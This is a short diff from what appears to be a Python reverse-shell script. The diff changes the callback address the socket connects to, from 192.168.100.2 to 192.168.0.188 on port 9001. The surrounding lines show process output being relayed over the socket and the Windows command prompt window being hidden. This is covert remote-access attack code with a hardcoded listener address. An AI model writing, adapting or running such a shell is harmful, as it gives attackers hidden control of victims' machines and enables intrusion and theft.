@@ -15,7 +15,7 @@ def p2s(s, p):
         s.send(p.stdout.read(1))
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.100.2", 9001))
+s.connect(("192.168.0.188", 9001))
 
 # Set up startupinfo to hide the command prompt window
 startupinfo = subprocess.STARTUPINFO()
